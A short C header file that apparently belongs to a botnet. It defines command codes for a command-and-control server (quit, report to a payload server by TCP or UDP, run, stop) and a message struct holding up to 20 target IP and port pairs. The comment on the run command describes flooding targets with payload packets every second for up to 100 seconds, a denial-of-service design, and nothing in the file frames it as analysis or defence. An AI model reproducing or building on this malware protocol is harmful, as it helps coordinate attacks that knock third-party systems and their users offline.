#include <arpa/inet.h>

#define COM_QUIT '0'     /* Quit the program - CnC is shutting down */
#define COM_PROG_TCP '1' /* Report using TCP to payload server given in the first IP PORT pair */
#define COM_PROG_UDP '2' /* Report using UDP to payload server given in the first IP PORT pair */
#define COM_RUN '3'      /* Send the recieved payloads from the payload server to the given IP PORT pairs. Iterate through N payloads and then through M targets, sending N*M packets each second for up to 100 seconds; interruptable by recieving command 4 (COM_STOP) from C&C */
#define COM_STOP '4'     /* If currently sending payloads to targets, stop it and await further commands */

struct ip_port {
    char ip[INET_ADDRSTRLEN];
    char port[22];
};

struct MSG {
    char command;
    struct ip_port targets[20];
};